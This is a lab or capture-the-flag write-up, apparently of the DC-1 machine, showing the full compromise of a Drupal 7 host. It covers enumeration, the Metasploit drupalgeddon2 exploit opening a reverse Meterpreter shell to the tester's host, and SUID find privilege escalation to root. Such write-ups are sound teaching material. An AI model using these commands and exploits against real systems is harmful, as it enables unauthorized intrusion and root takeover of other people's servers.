---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## Enumeration
### NMAP scan

Let's perform a simple `nmap` scan on the target.

```
$ nmap -p- -T5 192.168.210.193
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-30 03:34 UTC
Nmap scan report for 192.168.210.193
Host is up (0.011s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind              
40238/tcp open  unknown 

Nmap done: 1 IP address (1 host up) scanned in 2.90 seconds
```

Now we can use the `-A` options to execute all scripts against the open ports.

```
$ nmap -p 22,80,111,40238 -A 192.168.210.193
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-30 03:38 UTC
Nmap scan report for 192.168.210.193
Host is up (0.0011s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Welcome to Drupal Site | Drupal Site
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35685/udp6  status
|   100024  1          40238/tcp   status
|   100024  1          56691/udp   status
|_  100024  1          58362/tcp6  status
40238/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.54 seconds            
```

An important piece of information is the Drupal version having been identified as 7.

### Directory Brute Force

Let's perform some directory brute forcing to check what web directories are present.

```
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.210.193:80/FUZZ | grep "Status: 200"
________________________________________________

                        [Status: 200, Size: 7690, Words: 812, Lines: 150, Duration: 8147ms]
0                       [Status: 200, Size: 7690, Words: 812, Lines: 150, Duration: 3695ms]
index.php               [Status: 200, Size: 7690, Words: 812, Lines: 150, Duration: 3625ms]
LICENSE                 [Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 9ms]
node                    [Status: 200, Size: 7690, Words: 812, Lines: 150, Duration: 3747ms]
README                  [Status: 200, Size: 5376, Words: 678, Lines: 124, Duration: 181ms]
robots                  [Status: 200, Size: 1561, Words: 128, Lines: 61, Duration: 132ms]
robots.txt              [Status: 200, Size: 1561, Words: 128, Lines: 61, Duration: 152ms]
user                    [Status: 200, Size: 7543, Words: 761, Lines: 143, Duration: 3934ms]
web.config              [Status: 200, Size: 2178, Words: 416, Lines: 47, Duration: 19ms]
xmlrpc.php              [Status: 200, Size: 42, Words: 6, Lines: 1, Duration: 3330ms]
:: Progress: [4614/4614] :: Job [1/1] :: 12 req/sec :: Duration: [0:06:49] :: Errors: 0 ::
```

### Enumerating Drupal information

We can validate the Drupal version using the `droopescan` script.

```
$ ./droopescan scan drupal -u http://192.168.210.193:80/
[+] Plugins found:                                                              
    ctools http://192.168.210.193:80/sites/all/modules/ctools/
        http://192.168.210.193:80/sites/all/modules/ctools/LICENSE.txt
        http://192.168.210.193:80/sites/all/modules/ctools/API.txt
    views http://192.168.210.193:80/sites/all/modules/views/
        http://192.168.210.193:80/sites/all/modules/views/README.txt
        http://192.168.210.193:80/sites/all/modules/views/LICENSE.txt
    profile http://192.168.210.193:80/modules/profile/
    php http://192.168.210.193:80/modules/php/
    image http://192.168.210.193:80/modules/image/

[+] Themes found:
    seven http://192.168.210.193:80/themes/seven/
    garland http://192.168.210.193:80/themes/garland/

[+] Possible version(s):
    7.22
    7.23
    7.24
    7.25
    7.26

[+] Possible interesting urls found:
    Default admin - http://192.168.210.193:80/user/login

[+] Scan finished (0:06:29.205493 elapsed)
```

Let's check if there are any exploits present for Drupal version 7.2.

&nbsp;

## Exploitation

### Searchsploit

```
$ searchsploit drupal 7.2
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                                                                                                                         | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                                                                                                                          | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                                                                                                                               | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                                                                                                                               | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                                                                                                  | php/webapps/35150.php
Drupal < 7.34 - Denial of Service                                                                                                                                                                         | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                                                                  | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                                                                               | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                                                                       | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                                                                   | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                                                                          | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                                                                     | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                                                                                            | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                                                                                        | php/webapps/46459.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We can use the `exploit/unix/webapp/drupal_drupalgeddon2` module in Metasploit to exploit the target.
### Metasploit framework

```
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
```

```
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.210.193
```

```
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /
```

```
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST 192.168.45.247
```

```
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 192.168.45.247:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Sending stage (39927 bytes) to 192.168.210.193
[*] Meterpreter session 1 opened (192.168.45.247:4444 -> 192.168.210.193:43739) at 2024-04-30 11:07:07 +0530

meterpreter > 
```

&nbsp;

## Post Exploitation
### Spawning a tty shell

Let's first obtain a native shell.

```
meterpreter > shell
Process 5452 created.
Channel 1 created.
```

We can now upgrade this shell to a tty shell using Python.

```
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@DC-1:$
```

### Privilege escalation

We can use the `find` command to search for files on the system where the `setuid` bit is set.

```
www-data@DC-1:$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
```

We can now use on of these files to escalate our privilege.

Let's go to GTFOBins to search for an exploit for the `find` utility. 

![1](https://github.com/Kunull/Write-ups/assets/110326359/3ad3e713-0185-4392-b8fb-b010f246b217)

```
www-data@DC-1:/home/flag4$ find . -exec /bin/sh \; -quit
find . -exec /bin/sh \; -quit
# whoami
whoami
root
```

We are now the root user.
